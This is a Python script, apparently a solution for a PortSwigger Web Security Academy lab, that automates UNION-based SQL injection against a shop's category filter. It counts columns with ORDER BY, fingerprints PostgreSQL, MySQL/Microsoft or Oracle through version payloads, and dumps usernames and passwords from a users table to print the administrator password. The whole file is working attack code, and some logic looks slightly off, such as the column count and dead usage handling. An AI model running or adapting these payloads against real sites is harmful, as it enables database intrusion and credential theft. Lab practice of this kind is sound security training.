import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = None  # Disabled proxy - set to proxies config above if needed

def exploit_sqli_get_column_count(url, sqli_payload):
    path = "/filter?category=Gifts"
    for i in range(1, 51):  # Testing for column counts from 1 to 50
        test_payload = f"{sqli_payload}{i}-- "
        full_url = f"{url}{path}{test_payload}"
        response = requests.get(full_url, verify=False, proxies=proxies)
        if response.status_code != 200:
            return i - 1  # Return the last successful column count
    return None  # If no errors were encountered, return None

# Function to identify database type
def find_database_version(url):
    path = "/filter?category=Gifts"
    database_type_dictionary = {
        "PostgreSQL": "version()",
        "MySQL or Microsoft": "@@version",
        "Oracle": "version"}
    for db_type, version_func in database_type_dictionary.items():
        test_payload = f"'UNION select NULL, {version_func}--"
        full_url = f"{url}{path}{test_payload}"
        response = requests.get(full_url, verify=False, proxies=proxies)
        if response.status_code == 200 and version_func in response.text:
            print(f"[+] Database type identified: {db_type}")
            return db_type
  


def exploit_sqli_get_admin_password(url, sqli_payload):
    path = "/filter?category=Gifts"
    noOfColumns = exploit_sqli_get_column_count(url, sqli_payload)
    if noOfColumns is not None:
        payload_list = ["NULL"] * (noOfColumns+1)
        payload_list[1] = "username"
        payload_list[2] = "password"
        db_type = find_database_version(url)
        
        # Dictionary-based switch for database-specific handling
        db_payloads = {
            "PostgreSQL": f"'UNION select {payload_list[0]}, {payload_list[1]} ||'-'|| {payload_list[2]} from users--",
            "MySQL or Microsoft": f"'UNION select {payload_list[0]}, concat({payload_list[1]},',', {payload_list[2]}) from users--",
            "Oracle": f"'UNION select {payload_list[0]}, {payload_list[1]} ||'*'|| {payload_list[2]} from users--"
        }
        
        data_exfiltration_payload = db_payloads.get(db_type, f"'UNION select {', '.join(payload_list)} from users--")
        response = requests.get(url + path + data_exfiltration_payload, verify=False, proxies=proxies)
        result = response.text
        if "administrator" in result:
            print("[+] Successfully retrieved admin credentials:")
            soup = BeautifulSoup(result, 'html.parser')
            admin_password = soup.find(string=re.compile(".*administrator.*")).split('-' if db_type == "PostgreSQL" else (',' if db_type == "MySQL or Microsoft" else '*'))[1]
            print(f"[+] Admin Password: {admin_password}")
            return True
        return False
    

if __name__ == "__main__":
    try:
        # url = sys.argv[1].strip()  # Get the URL from command line arguments
        url = "https://0a5c0014045d93b782698d6e00600035.web-security-academy.net"
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(1)
    print("[+] Figuring out number of columns...")
    sqli_payload = "'order+by+"
    print("[+] Dumping the list of usernames and passwords...")
    if(exploit_sqli_get_admin_password(url, sqli_payload)):
        print("[+] The site appears to be vulnerable to SQL Injection and admin credentials were retrieved.")
    else:
        print("[-] The site does not appear to be vulnerable to SQL Injection or admin credentials could not be retrieved.")